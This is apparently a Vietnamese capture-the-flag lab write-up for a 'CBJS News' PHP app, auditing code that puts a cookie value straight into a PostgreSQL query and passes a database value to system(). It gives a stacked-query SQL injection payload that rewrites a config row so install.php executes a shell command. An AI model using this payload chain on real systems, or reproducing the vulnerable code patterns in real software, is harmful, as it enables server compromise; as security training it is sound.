# LAB 03 - CBJS News
## Mục tiêu
Mục tiêu: RCE server và đọc bí mật ở thư mục gốc

## Source code audit

**index.php**
```php
if (isset($_GET["lang"])) {
  $language = $_GET["lang"];
  unset($_COOKIE);
  setcookie('lang', $language, time() + 60 * 60 * 24 * 30, '/', $_SERVER['SERVER_NAME']);
}

// Get `current language` via Cookie
if (isset($_COOKIE['lang'])) {
  $language = $_COOKIE['lang'];
}

// Fetch data according to `current language`
$result = pg_query($db, "SELECT id, title, content, link FROM news WHERE language = '$language'");
$row = pg_fetch_row($result);
```

Untrusted data `COOKIE lang` được thêm vào câu query --> **SQLi**

**install.php**
```php
$result = pg_query($db, "SELECT value FROM configs WHERE name = 'install_script'");
$row = pg_fetch_row($result);
$install_script = $row[0];

// Execute install_script
system($install_script);
```
Sink nguy hiểm `system()` biến `$result` có thể thao túng được nếu ta chỉnh sửa được table `configs` --> Có thể dẫn đến `Command Injection`  

Câu lệnh truy vấn `pg_query` cho thấy server đang sử dụng hệ CSDL `Postgre`

## Ý tưởng

1. Lợi dụng lỗi SQLi cập nhật bảng `config`, cột `value` sẽ là một command. Tiếp theo `install.php` sẽ thực hiện truy vấn và lấy kết quả trả về (là command) đưa vào sink `system()`

`UPDATE configs SET value='ls /' WHERE name = 'install_script'`

## Khai thác
1. Cập nhật bảng `config` bằng SQLi thông qua thao túng `GET lang`, payload --> `; UPDATE configs SET value='ls /' WHERE name = 'install_script'--`
2. Truy cập **install.php** chạy command, ta có được đường dẫn flag
